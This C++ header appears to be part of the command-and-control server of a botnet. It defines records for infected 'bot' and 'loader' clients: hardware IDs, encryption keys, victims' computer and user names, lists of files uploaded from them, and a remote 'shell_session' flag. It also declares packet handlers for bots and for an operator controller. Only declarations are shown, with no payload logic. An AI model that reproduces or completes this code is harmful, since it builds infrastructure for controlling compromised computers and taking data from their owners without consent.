#pragma once
#include <ws2tcpip.h>
#include <fstream>
#include "packets.h"
#include "log.h"
#include <set>

enum client_type
{
	bot,
	loader,
	unknown
};

struct speedtest_info
{
	bool performed_speedtest;
	unsigned int elapsed_time;

	void Reset()
	{
		performed_speedtest = false;
		elapsed_time = 0;
	}
};

struct bot_info
{
	client_type type;
	unsigned long long hwid;
	unsigned long long crypto_key;
	char computer_name[50];
	char user_name[50];
	bool is_vs_installed;
	std::set<std::string> uploaded_files_list;
	speedtest_info speedtest;

	void reset()
	{
		type = client_type::unknown;
		hwid = 0;
		strcpy(computer_name, "Unknown");
		strcpy(user_name, "Unknown");
		is_vs_installed = false;
		uploaded_files_list.clear();
		crypto_key = packet_crypto_key;
		speedtest.Reset();
	}
};


class client
{
public:
	client(SOCKET sock);
	~client();

	char* get_client_ip();
	bool send_packet(packet_opcode opcode, void* data = nullptr, int data_size = 0);
	bool parse_packet();
	SOCKET get_client_socket() { return socket; }
	bool handle_bot_packet(packet_opcode opcode, void* packet_buf, int packet_size);
	bool handle_controller_packet(packet_opcode opcode, void* packet_buf, int packet_size);
	bot_info* get_bot_info() { return &my_info; }
	void print_received_packet(packet_opcode opcode, int packet_size);
	
public:
	bool shell_session;
private:
	SOCKET socket;
	client_log* logger;
	bot_info my_info;
	//bool controller_socket;
};

